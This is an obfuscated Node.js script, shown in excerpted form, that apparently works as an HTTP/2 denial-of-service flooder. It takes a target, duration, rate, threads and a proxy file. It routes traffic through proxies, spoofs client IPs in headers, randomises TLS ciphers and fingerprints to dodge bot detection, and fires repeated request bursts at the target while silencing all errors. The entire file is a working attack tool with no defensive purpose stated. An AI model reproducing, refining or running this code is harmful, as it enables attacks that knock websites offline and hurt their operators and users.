const net = require('net'),
    ...
    errorHandler = (_0x3e2e31) => {}
process.on('uncaughtException', errorHandler)
process.on('unhandledRejection', errorHandler)
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (_0x49f889) {})
process.argv.length < 7 &&
    (console.log('Usage: target time rate thread proxyfile'), process.exit())
const headers = {}
function readLines(_0x3c6667) {
    return fs.readFileSync(_0x3c6667, 'utf-8').toString().split(/\r?\n/)
}
function randomIntn(_0x1e11c0, _0x43664d) {
    return Math.floor(Math.random() * (_0x43664d - _0x1e11c0) + _0x1e11c0)
}
function randomElement(_0x4ea108) {
    return _0x4ea108[randomIntn(0, _0x4ea108.length)]
}
function randstr(_0x486a88) {
    const _0x3754fb =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let _0x3c2299 = ''
    const _0x3ed212 = _0x3754fb.length
    for (let _0xee0654 = 0; _0xee0654 < _0x486a88; _0xee0654++) {
        _0x3c2299 += _0x3754fb.charAt(Math.floor(Math.random() * _0x3ed212))
    }
    return _0x3c2299
}
const ip_spoof = () => {
        ...
        return (
            _0x4d9e88() + '.' + _0x4d9e88() + '.' + _0x4d9e88() + '.' + _0x4d9e88()
        )
    },
    spoofed = ip_spoof(),
    ip_spoof2 = () => {
...
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
    jar = jalist[Math.floor(Math.floor(Math.random() * jalist.length))],
    siga = sig[Math.floor(Math.floor(Math.random() * sig.length))],
    tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))],
    a = a6[Math.floor(Math.floor(Math.random() * a6.length))],
    methodd = methods[Math.floor(Math.floor(Math.random() * methods.length))],
...
class NetSocket {
    constructor() {}
        ['HTTP'](_0xb229a6, _0x47c9c1) {
            const _0x2affb8 = _0xb229a6.address.split(':'),
                _0x3a64e8 = _0x2affb8[0],
                _0x4a4331 =
                'CONNECT ' +
                _0xb229a6.address +
                ':443 HTTP/1.1\r\nHost: ' +
                _0xb229a6.address +
                ':443\r\nConnection: Keep-Alive\r\n\r\n',
                _0x5164f3 = new Buffer.from(_0x4a4331),
                _0x53b308 = net.connect({
                    host: _0xb229a6.host,
                    port: _0xb229a6.port,
                })
            _0x53b308.setTimeout(_0xb229a6.timeout * 600000)
            _0x53b308.setKeepAlive(true, 100000)
            _0x53b308.on('connect', () => {
                _0x53b308.write(_0x5164f3)
            })
            _0x53b308.on('data', (_0x193f7d) => {
                const _0x42779d = _0x193f7d.toString('utf-8'),
                    _0x2bd462 = _0x42779d.includes('HTTP/1.1 200')
                if (_0x2bd462 === false) {
                    return (
                        _0x53b308.destroy(),
                        _0x47c9c1(undefined, 'error: invalid response from proxy server')
                    )
                }
                return _0x47c9c1(_0x53b308, undefined)
            })
            _0x53b308.on('timeout', () => {
                return (
                    _0x53b308.destroy(), _0x47c9c1(undefined, 'error: timeout exceeded')
                )
            })
            _0x53b308.on('error', (_0xf927d4) => {
                return _0x53b308.destroy(), _0x47c9c1(undefined, 'error: ' + _0xf927d4)
            })
        }
}
var hd = {}
...
function runFlooder() {
    const _0xa46203 = randomElement(proxies),
        _0x5c3f96 = _0xa46203.split(':')
    ...
    Socker.HTTP(_0x110c6b, (_0x25b34a, _0x4653bb) => {
        if (_0x4653bb) {
            return
        }
        _0x25b34a.setKeepAlive(true, 600000)
        const _0x3b50e0 = {
            ...
            _0x286565 = tls.connect(443, parsedTarget.host, _0x3b50e0)
        _0x286565.setKeepAlive(true, 60000)
        const _0xa4f3c2 = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: {
                headerTableSize: (() => Math.floor(Math.random() * 15865538) + 65535)(),
                maxConcurrentStreams: 100,
                initialWindowSize: (() =>
                    Math.floor(Math.random() * 15865538) + 65535)(),
                maxFrameSize: (() => Math.floor(Math.random() * 15865538) + 65535)(),
                enablePush: false,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => _0x286565,
            socket: _0x25b34a,
        })
        _0xa4f3c2.settings({
            headerTableSize: (() => Math.floor(Math.random() * 15865538) + 65535)(),
            maxConcurrentStreams: 100,
            initialWindowSize: (() => Math.floor(Math.random() * 15865538) + 65535)(),
            maxFrameSize: (() => Math.floor(Math.random() * 15865538) + 65535)(),
            enablePush: false,
        })
        _0xa4f3c2.on('connect', () => {
            const _0x577a9a = setInterval(() => {
                const _0x54fe2e = {
                    ...headers,
                ...
                for (let _0xd02bcf = 0; _0xd02bcf < args.Rate; _0xd02bcf++) {
                    headers.ja3 = jar
                    const _0x47d17c = _0xa4f3c2.request(_0x54fe2e)
                    _0xa4f3c2.on('response', (_0x80d271) => {
                        _0x47d17c.close()
                        _0x47d17c.destroy()
                        return
                    })
    ...
    (function (_0x1cdd39, _0x433455, _0x131c92) {})
}
